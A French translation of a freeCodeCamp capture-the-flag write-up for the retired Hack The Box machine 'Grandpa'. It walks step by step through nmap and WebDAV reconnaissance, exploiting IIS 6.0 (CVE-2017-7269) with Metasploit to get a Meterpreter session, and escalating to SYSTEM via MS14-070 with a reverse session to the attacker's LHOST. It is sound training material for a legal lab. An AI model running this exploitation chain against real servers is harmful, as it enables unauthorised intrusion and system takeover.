---
title: Restez calme et pirater la boîte - Grandpa
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-04-29T09:02:33.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-grandpa
coverImage: https://www.freecodecamp.org/news/content/images/2020/04/maureen-white-1.jpeg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
- name: Windows
  slug: windows
seo_title: Restez calme et pirater la boîte - Grandpa
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them are simulating real world scenarios and some of them lean more towards a
  CTF style...
---

Hack The Box (HTB) est une plateforme en ligne qui vous permet de tester vos compétences en matière de tests d'intrusion. Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent davantage vers un style de défi CTF.

**Note**. _Seuls les write-ups des machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-07-at-14.54.17.png)

Grandpa est l'une des machines les plus simples sur Hack The Box, cependant elle couvre le CVE-2017-7269 largement exploité. Cette vulnérabilité est triviale à exploiter et a accordé un accès immédiat à des milliers de serveurs IIS dans le monde lorsqu'elle est devenue de notoriété publique.

Nous allons utiliser les outils suivants pour pirater la boîte sur une [Kali Linux box](https://www.kali.org/)

* nmap
* Searchsploit
* davtest
* Metasploit
* Local exploit suggester

Commençons.

J'ajoute grandpa dans le fichier /etc/hosts

```bash
nano /etc/hosts
```

avec

```bash
10.10.10.14     grandpa.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-21.58.02.png)

## Étape 1 - Reconnaissance

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter par la suite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

## Scanning des ports

Je vais utiliser Nmap (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité. Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.00.02.png)

J'utilise la commande suivante pour effectuer un scan intensif :

```bash
nmap -A -v grandpa.htb
```

**-A:** Active la détection du système d'exploitation, la détection de version, le scanning de script et le traceroute

**-v:** Augmente le niveau de verbosité

**grandpa.htb:** nom d'hôte pour la boîte Grandpa

Si vous trouvez les résultats un peu trop écrasants, vous pouvez faire une autre commande pour obtenir uniquement les ports ouverts.

```bash
nmap grandpa.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-21.59.22.png)

Nous pouvons voir qu'il n'y a qu'un seul port ouvert :

**Port** 80. le plus souvent utilisé par le protocole Hypertext Transfer Protocol (HTTP)

Nous savons que le serveur est un IIS 6.0 à partir de l'en-tête http-server-header. **Internet Information Services** (**IIS**, anciennement **Internet Information Server**) est un logiciel de serveur web extensible créé par Microsoft pour une utilisation avec la famille Windows NT. Plus d'informations [ici](https://en.wikipedia.org/wiki/Internet_Information_Services)

> IIS 6.0 (nom de code "Duct Tape"), inclus avec Windows Server 2003 et Windows XP Professional x64 Edition, a ajouté la prise en charge de IPv6 et incluait un nouveau modèle de processus de travail qui augmentait la sécurité ainsi que la fiabilité HTTP.sys a été introduit dans IIS 6.0 en tant qu'écouteur de protocole spécifique à HTTP pour les requêtes HTTP

Nous pouvons également voir à partir du **http-title** que le site web est "en construction" et qu'il y a un **http-webdav-scan** avec toutes les méthodes autorisées

J'utilise le script nmap pour essayer d'obtenir plus d'informations. Le script envoie une requête OPTIONS qui liste le type dav, le type de serveur, la date et les méthodes autorisées. Il envoie ensuite une requête PROPFIND et essaie de récupérer les répertoires exposés et les adresses IP internes en effectuant une correspondance de motifs dans le corps de la réponse

```bash
nmap --script http-webdav-scan -p80 grandpa.htb
```

Voici plus d'[info](https://nmap.org/nsedoc/scripts/http-webdav-scan.html) sur ce script à partir du site web de nmap

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.00.37.png)

WebDAV ou **Web Distributed Authoring and Versioning** (**WebDAV**) est une extension du protocole Hypertext Transfer Protocol qui permet aux clients d'effectuer des opérations d'édition de contenu web à distance. Plus d'informations [ici](https://en.wikipedia.org/wiki/WebDAV)

Nous pouvons voir dans la section support du serveur que Microsoft's IIS a un module WebDAV.

J'utilise [**davtest**](https://tools.kali.org/web-applications/davtest) pour vérifier si je peux télécharger des fichiers

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.54.24.png)

J'utilise la commande suivante

```bash
davtest -url http://10.10.10.14
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.18.29.png)

Cela ne semble pas possible. J'utilise **Searchsploit** pour vérifier s'il y a une vulnérabilité connue sur IIS 6.0. Searchsploit est un outil de recherche en ligne de commande pour **[Exploit Database](https://www.exploit-db.com/)**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.01.08.png)

J'utilise la commande suivante

```bash
searchsploit iis 6.0
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.02.14.png)

Je peux obtenir plus de détails sur l'exploit avec

```bash
searchsploit -x 41738.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-13-at-22.01.38.png)

L'attaque est basée sur une chaîne de [Return-oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming). **Return-oriented programming** (**ROP**) est une technique d'exploitation de sécurité qui permet à un attaquant d'exécuter du code en présence de défenses de sécurité telles que la protection de l'espace exécutable et la signature de code

Vous pouvez également consulter la **Exploit Database** pour trouver l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.28.52.png)
_[https://www.exploit-db.com/search?q=iis+6.0](https://www.exploit-db.com/search?q=iis+6.0)_

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-07-at-16.19.42.png)
_[https://www.exploit-db.com/exploits/41738](https://www.exploit-db.com/exploits/41738)_

la **National Vulnerability Database**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-22.56.07.png)
_[https://nvd.nist.gov/vuln/detail/CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269)_

la base de données **Common Vulnerabilities and Exposure**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-22.57.52.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-07-at-16.20.27.png)
_[https://www.cvedetails.com/cve/CVE-2017-7269/](https://www.cvedetails.com/cve/CVE-2017-7269/)_

Il y a un module Metasploit disponible

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-07-at-16.20.54.png)
_[https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl)_

## Étape 2 - Visite du site web

Nous ne voyons pas grand-chose en visitant le site web. À partir de la console du développeur, nous pouvons voir qu'il est alimenté par le framework [ASP.NET](https://dotnet.microsoft.com/apps/aspnet)

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.50.25.png)

Nous allons utiliser **Metasploit**, qui est un framework de test de pénétration qui simplifie le piratage. C'est un outil essentiel pour de nombreux attaquants et défenseurs

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/)_

Je lance **Metasploit Framework** sur Kali et cherche la commande que je devrais utiliser pour lancer l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.33.34.png)

Si j'utilise cette commande

```bash
searchsploit iis 6.0
```

J'obtiens le même tableau que celui que j'avais depuis le Terminal plus tôt

Si je tape

```bash
search iis 6.0
```

J'obtiens 174 résultats

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.38.22.png)

L'exploit qui m'intéresse est le numéro 147 sur cette liste

Si vous souhaitez avoir des informations sur l'exploit, vous pouvez utiliser la commande suivante

```bash
info exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

Et vous obtiendrez plus de détails sur l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-23.11.30.png)

J'utilise la commande suivante pour utiliser l'exploit

```bash
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

Je dois configurer les options avant de lancer l'exploit. Je vérifie les options avec

```bash
show options
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.43.36.png)

Je configure **RHOSTS** avec la commande suivante

```bash
set RHOSTS 10.10.10.14
```

Lorsque je vérifie à nouveau les options, j'obtiens ceci

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-14.47.50.png)

Je vérifie si la cible est vulnérable avec

```bash
check
```

Ensuite, je lance l'exploit avec la commande

```bash
exploit
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-15.40.40.png)

Et j'obtiens une session **Meterpreter**

D'après le site [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/), nous obtenons cette définition pour Meterpreter

> Meterpreter est une charge utile avancée, dynamiquement extensible qui utilise des stagers d'injection de DLL _in-memory_ et est étendue sur le réseau au moment de l'exécution. Il communique via la socket du stager et fournit une API Ruby complète côté client. Il dispose d'un historique des commandes, d'une complétion par tabulation, de canaux, et plus encore.

Vous pouvez en savoir plus sur Meterpreter [ici](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

Commençons par recueillir quelques informations

**getuid** retourne le vrai identifiant utilisateur du processus appelant. La session que j'ai obtenue ne semble pas avoir suffisamment de privilèges pour exécuter cette commande. L'accès est refusé

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-24-at-15.41.37.png)

Lorsque cela se produit, je liste les processus en cours avec

```bash
ps
```

et j'en choisis un qui s'exécute sous **NT AUTHORITY\NETWORK SERVICE**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.59.49.png)

Je migre vers le processus 3644 avec

```bash
migrate 3644
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.58.21.png)

Maintenant, lorsque je vérifie getuid, j'obtiens

```bash
Server username: NT AUTHORITY\NETWORK SERVICE
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-15.58.37.png)

C'était la session que j'ai obtenue au début avant de migrer vers un autre processus

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.20.57.png)

C'est la session que j'ai obtenue après avoir migré vers un autre processus

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.21.14.png)

Je tape la commande suivante pour obtenir un shell standard sur le système cible

```bash
shell
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.01.13.png)

Je vérifie qui je suis sur la machine avec la commande

```bash
whoami
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.01.23.png)

J'obtiens plus d'informations de la machine avec

```bash
systeminfo
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.01.35.png)

Je navigue vers **C:\**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.03.43.png)

puis **Documents and Settings** avec

```bash
cd "Documents and Settings"
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.04.05.png)

Je peux voir deux utilisateurs - **Administrator** et **Harry**. J'essaie de naviguer vers Harry. L'accès est refusé. Même chose pour le dossier Administrator - ce qui est attendu car je n'ai pas encore accès root

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.04.13.png)

Je quitte le shell avec la commande

```bash
exit
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.06.47.png)

## Étape 3 - Utilisation du local exploit suggester

J'exécute le [**local exploit suggester**](https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester). Les exploits sont suggérés en fonction de l'architecture et de la plateforme sur lesquelles l'utilisateur a ouvert un shell ainsi que des exploits disponibles dans meterpreter

```bash
run post/multi/recon/local_exploit_suggester
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.07.12.png)

Je vais utiliser l'exploit **MS14-070**. Je cherche plus d'informations sur **Metasploit** avec

```bash
info exploit/windows/local/ms14_070_tcpip_ioctl
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-23.36.28.png)

Ainsi que sur le site **Rapid7**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-23.33.04.png)
_[https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl)_

## Étape 4 - Utilisation de MS14-070 pour effectuer une élévation de privilèges

Je mets cette session en arrière-plan avec la commande

```bash
background
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.11.48.png)

J'exécute la commande suivante pour utiliser l'exploit que j'ai trouvé

```bash
use exploit/windows/local/ms14_070_tcpip_ioctl
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.12.00.png)

Je vérifie ensuite les options de cet exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.12.33.png)

Je configure la session avec

```bash
set SESSION 1
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.12.49.png)

J'exécute l'exploit avec

```bash
run
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.13.05.png)

L'exploit a réussi mais je n'ai pas obtenu de shell en retour. Je vérifie les options

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.13.16.png)

et je configure le LHOST avec mon IP avec

```bash
set LHOST 10.10.14.36
```

Vous pouvez vérifier la vôtre [ici](https://www.hackthebox.eu/home/htb/access)

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.13.44.png)

Je lance ensuite l'exploit avec

```bash
exploit
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.13.57.png)

Cela confirme que l'exploit a réussi mais je n'ai toujours pas de shell. Je vérifie la session avec

```bash
sessions -l
```

Je devrais avoir

```bash
NT AUTHORITY\SYSTEM
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.16.36.png)

Ce qui n'est pas le cas maintenant, donc je reviens à cette session avec

```bash
sessions -i 1
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.38.45.png)

Je vérifie **getuid** et j'obtiens **NT AUTHORITY\SYSTEM** en retour. J'obtiens un shell standard sur le système cible et je vérifie qui je suis sur la machine. J'obtiens **NT AUTHORITY\NETWORK SERVICE** en retour, ce qui n'est pas ce que je veux !

Je quitte ce shell et je vérifie les processus. Je peux voir que j'ai un accès admin sur la machine. Je dois simplement migrer vers un autre processus - ce que je fais avec

```bash
migrate 408
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.39.58.png)

De retour au shell standard sur le système cible et lorsque je vérifie qui je suis sur la machine, je suis enfin un admin !

## **Étape 5** - Recherche du flag user.txt

Je navigue vers le dossier **Harry** depuis **Documents and Settings**

Je peux lister tous les fichiers/dossiers avec la commande suivante

```bash
dir
```

Je me déplace ensuite vers le **Desktop**

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.53.25.png)

Et je trouve le flag utilisateur ! Je peux vérifier le contenu du fichier avec

```bash
type user.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.42.19.png)

## **Étape 6** - Recherche du flag root.txt

Trouvons le flag root maintenant ! Je navigue jusqu'à **Users** et je vérifie dans le dossier **Administrator**/**Desktop**. Je trouve le flag !

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.42.58.png)

J'utilise la commande suivante pour voir le contenu du fichier

```bash
type root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-28-at-16.43.08.png)

Félicitations ! Vous avez trouvé les deux flags !

N'hésitez pas à commenter, poser des questions ou partager avec vos amis :)

Vous pouvez voir plus de mes articles [ici](https://www.freecodecamp.org/news/author/sonya/)

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure** !

---

**Autres articles Hack The Box**

* [Restez calme et pirater la boîte - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Restez calme et pirater la boîte - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Restez calme et pirater la boîte - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Restez calme et pirater la boîte - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)
* [Restez calme et pirater la boîte - Optimum](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-optimum/)
* [Restez calme et pirater la boîte - Arctic](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-arctic/)

![Artiste - Maureen White](https://www.freecodecamp.org/news/content/images/2020/04/maureen-white-2.jpeg)